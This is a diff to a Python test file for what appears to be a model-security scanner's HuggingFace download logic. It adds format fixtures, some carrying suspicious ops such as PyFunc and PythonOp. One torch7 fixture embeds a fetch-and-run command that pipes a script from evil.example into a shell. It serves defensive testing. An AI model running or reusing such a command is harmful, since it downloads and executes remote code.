@@ -1,12 +1,14 @@
 """Tests for HuggingFace URL handling."""
 
+import importlib
 import pickle
 import struct
 import tarfile
-from collections.abc import Iterator
+from collections.abc import Callable, Iterator
 from io import BytesIO
 from pathlib import Path
 from types import SimpleNamespace
+from typing import cast
 from unittest.mock import ANY, MagicMock, patch
 
 import pytest
@@ -26,6 +28,8 @@ from modelaudit.utils.sources.huggingface import (
     parse_huggingface_url,
     redact_huggingface_url_for_display,
 )
+from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs
+from tests.helpers import create_mock_coreml, create_mock_onnx
 
 _HF_TEST_REVISION = "a" * 40
 
@@ -73,6 +77,29 @@ def _make_xgboost_ubjson_payload() -> bytes:
         + b"[]"
         + b"}"
     )
+
+
+def _make_tensorflow_savedmodel_payload(_tmp_path: Path) -> bytes:
+    if not has_tensorflow_protobuf_stubs():
+        pytest.skip("TensorFlow protobuf stubs unavailable")
+    import modelaudit.protos  # noqa: F401
+
+    saved_model_pb2 = importlib.import_module("tensorflow.core.protobuf.saved_model_pb2")
+    saved_model = saved_model_pb2.SavedModel()
+    saved_model.saved_model_schema_version = 1
+    node = saved_model.meta_graphs.add().graph_def.node.add()
+    node.name = "pyfunc_node"
+    node.op = "PyFunc"
+    return cast(bytes, saved_model.SerializeToString())
+
+
+def _make_coreml_payload(tmp_path: Path) -> bytes:
+    return create_mock_coreml(tmp_path / "fixture.mlmodel").read_bytes()
+
+
+def _make_onnx_payload(tmp_path: Path) -> bytes:
+    pytest.importorskip("onnx")
+    return create_mock_onnx(tmp_path / "fixture.onnx", op_type="PythonOp").read_bytes()
 
 
 class TestHuggingFaceURLDetection:
@@ -466,7 +493,7 @@ class TestModelDownload:
     @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
     @patch(
         "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
-        return_value=(["weights[latest]*?.bin"], _HF_TEST_REVISION, None),
+        return_value=(["weights[latest].bin"], _HF_TEST_REVISION, None),
     )
     @patch("huggingface_hub.snapshot_download")
     def test_download_model_escapes_selected_filenames_as_exact_allow_patterns(
@@ -480,12 +507,12 @@ class TestModelDownload:
         download_path = tmp_path / "download"
         download_path.mkdir()
         (download_path / "config.json").write_text("{}")
-        (download_path / "weights[latest]*?.bin").write_bytes(b"weights")
+        (download_path / "weights[latest].bin").write_bytes(b"weights")
         mock_snapshot_download.return_value = str(download_path)
 
         download_model("https://huggingface.co/test/model")
 
-        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["weights[[]latest][*][?].bin"]
+        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["weights[[]latest].bin"]
 
     @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
     @patch(
@@ -587,6 +614,14 @@ class TestModelDownload:
             _make_xgboost_ubjson_payload(),
             b'{"nodes":[{"op":"Custom","name":"load"}],"arg_nodes":[0],"heads":[[0,0,0]]}',
             b"\x0c\x00\x00\x00ET13\x04\x00\x04\x00\x04\x00\x00\x00",
+            b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03",
+            b"\xdb" + (9000).to_bytes(4, "big") + b"x" * 9000 + b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03",
+            (
+                b"4\n1\n3\nV 1\n13\nnn.Sequential\n"
+                b"4\n2\n3\nV 1\n17\ntorch.FloatTensor\n"
+                b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
+            ),
+            b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llamafile runtime\n",
         ],
         ids=[
             "safetensors",
@@ -599,6 +634,10 @@ class TestModelDownload:
             "xgboost-ubjson",
             "mxnet",
             "executorch",
+            "flax-msgpack",
+            "flax-msgpack-delayed-root",
+            "torch7",
+            "llamafile",
         ],
     )
     @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
@@ -631,6 +670,45 @@ class TestModelDownload:
         assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION
 
     @pytest.mark.parametrize(
+        "payload_factory",
+        [
+            _make_tensorflow_savedmodel_payload,
+            _make_coreml_payload,
+            _make_onnx_payload,
+        ],
+        ids=["tensorflow-protobuf", "coreml-protobuf", "onnx-protobuf"],
+    )
+    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
+    @patch(
+        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
+        return_value=(["pytorch_model.bin", "hidden.payload"], _HF_TEST_REVISION, None),
+    )
+    @patch("requests.get")
+    @patch("huggingface_hub.snapshot_download")
+    def test_download_model_includes_bounded_content_routed_protobuf_payloads(
+        self,
+        mock_snapshot_download: MagicMock,
+        mock_requests_get: MagicMock,
+        _mock_list_repo_files: MagicMock,
+        _mock_get_extensions: MagicMock,
+        tmp_path: Path,
+        payload_factory: Callable[[Path], bytes],
+    ) -> None:
+        """Selective downloads should preserve renamed framework protobuf payloads."""
+        payload = payload_factory(tmp_path)
+        download_path = tmp_path / "download"
+        download_path.mkdir()
+        (download_path / "pytorch_model.bin").write_bytes(b"weights")
+        (download_path / "hidden.payload").write_bytes(payload)
+        mock_snapshot_download.return_value = str(download_path)
+        mock_requests_get.return_value = _FakeRangeResponse(payload)
+
+        download_model("https://huggingface.co/test/model")
+
+        assert mock_snapshot_download.call_args.kwargs["allow_patterns"] == ["pytorch_model.bin", "hidden.payload"]
+        assert mock_snapshot_download.call_args.kwargs["revision"] == _HF_TEST_REVISION
+
+    @pytest.mark.parametrize(
         "payload",
         [
             struct.pack("<Q", 4) + b"\x00" * 8,
@@ -644,6 +722,13 @@ class TestModelDownload:
             b"{" + _ubjson_key(b"learner") + b"{}" + _ubjson_key(b"metadata") + b"{}" + b"}",
             b'{"nodes":[{"op":"Custom"}],"arg_nodes":[],"heads":[[0,0,0]]}',
             b"\x0c\x00\x00\x00ETAA\x04\x00\x04\x00\x04\x00\x00\x00",
+            b"\x81\xa8metadata\xa4safe",
+            b"import torch\nimport torch.nn as nn\n\nclass Model(nn.Module):\n    pass\n",
+            b"\x7fELF" + b"\x02\x01\x01\x00" + b"\x00" * 56 + b"llama-file runtime",
+            b"\x12\x02\x08\x01",
+            b"\x08\x08\x12\x02\x08\x01",
+            b"\x08\x08\x3a\x02\x08\x01",
+            b"\x06\xc1" + b"\x00" * ((1024 * 1024) + 32),
         ],
         ids=[
             "malformed-safetensors",
@@ -654,6 +739,13 @@ class TestModelDownload:
             "xgboost-ubjson-near-match",
             "mxnet-notes",
             "executorch-near-match",
+            "flax-msgpack-near-match",
+            "torch7-source-near-match",
+            "llamafile-near-match",
+            "tensorflow-protobuf-near-match",
+            "coreml-protobuf-near-match",
+            "onnx-protobuf-near-match",
+            "large-invalid-msgpack-near-match",
         ],
     )
     @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
